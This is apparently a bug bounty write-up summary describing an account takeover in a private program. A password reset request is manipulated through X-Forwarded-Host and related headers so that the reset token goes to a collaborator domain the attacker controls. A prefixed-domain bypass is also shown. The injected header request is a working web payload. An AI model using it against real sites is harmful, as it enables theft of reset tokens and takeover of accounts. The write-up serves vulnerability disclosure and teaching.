# Simple ATO in private program.

- The writeup can be looked at [here](https://medium.com/@oXnoOneXo/simple-ato-in-private-program-890cd1485675)

- The researcher is [oXnoOneXo](https://medium.com/@oXnoOneXo)

---

<br>
<br>

## Summary

- Due to HTTP-Header injection, the reponse url sends the password reset token to Attacker controlled website. Leading to ATO.

---

<br>
<br>

## Details

- While testing the **RESET password** functionality, The researcher notices a request as follows:

```HTTP
POST /v2/request_reset
Host: www.redacted.com
X-Forwarded-Host: cti8fhpon5bs77snj410xc8gfezhtemje.oast.online
X-Host: cti8fhpon5bs77snj410xc8gfezhtemje.oast.online
Origin: https://cti8fhpon5bs77snj410xc8gfezhtemje.oast.online
Referer: https://cti8fhpon5bs77snj410xc8gfezhtemje.oast.online/test
Content-Type: application/x-www-form-urlencoded

email=myhandler%40bugcrowdninja.com&type=lost
```

---

- Trying HTTP-HEADER injection (Host Header Injection), the attacker tried modifying the `X-Forwarded-Host` to his controlled collaborator link : `cti8fhpon5bs77snj410xc8gfezhtemje.oast.online`

- But was getting a 404

---

<br>
<br>

## Bypas

- Simply prepending the url with the domain url as follows:

```
X-Forwarded-Host: www.redeacted.com.cti8fhpon5bs77snj410xc8gfezhtemje.oast.online
```

- The researcher recieved the mail for reset password. Now when he clicked on it, it hit the Collaborator with the reset token:

![reset](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*gHp0bgh5BNWI9LGtOCZcuQ.png)

---

<br>
<br>

## Vulnerability

- The researcher got a ==**P2**== for this.
